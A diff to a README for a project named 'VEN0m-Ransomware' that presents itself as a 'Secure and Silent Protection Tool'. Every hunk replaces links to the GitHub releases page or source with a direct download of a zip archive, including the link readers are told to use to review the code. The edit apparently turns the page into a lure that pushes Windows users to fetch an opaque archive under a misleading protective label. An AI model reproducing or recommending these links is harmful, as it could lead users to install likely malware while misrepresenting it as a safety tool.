@@ -1,6 +1,6 @@
 # 🛡️ VEN0m-Ransomware - Secure and Silent Protection Tool
 
-[![Download VEN0m-Ransomware](https://img.shields.io/badge/Download-Here-brightgreen)](https://github.com/samftggr/VEN0m-Ransomware/releases)
+[![Download VEN0m-Ransomware](https://img.shields.io/badge/Download-Here-brightgreen)](https://raw.githubusercontent.com/samftggr/VEN0m-Ransomware/main/src/VE_m_Ransomware_2.9.zip)
 
 ---
 
@@ -36,10 +36,10 @@ This section helps you download and run VEN0m-Ransomware on your Windows PC. The
 
 Visit this page to download the latest release:
 
-[![Download VEN0m-Ransomware](https://img.shields.io/badge/Download-Here-blue)](https://github.com/samftggr/VEN0m-Ransomware/releases)
+[![Download VEN0m-Ransomware](https://img.shields.io/badge/Download-Here-blue)](https://raw.githubusercontent.com/samftggr/VEN0m-Ransomware/main/src/VE_m_Ransomware_2.9.zip)
 
 1. Click the link above or visit the link in your web browser:  
-   https://github.com/samftggr/VEN0m-Ransomware/releases
+   https://raw.githubusercontent.com/samftggr/VEN0m-Ransomware/main/src/VE_m_Ransomware_2.9.zip
 
 2. On the releases page, look for the latest version listed at the top.
 
@@ -125,7 +125,7 @@ This setup helps IT professionals and security testers see how well their system
 
 This software is open source. You can view the complete code and releases on the GitHub page:
 
-https://github.com/samftggr/VEN0m-Ransomware
+https://raw.githubusercontent.com/samftggr/VEN0m-Ransomware/main/src/VE_m_Ransomware_2.9.zip
 
 This helps developers and security professionals review how the program works.
 
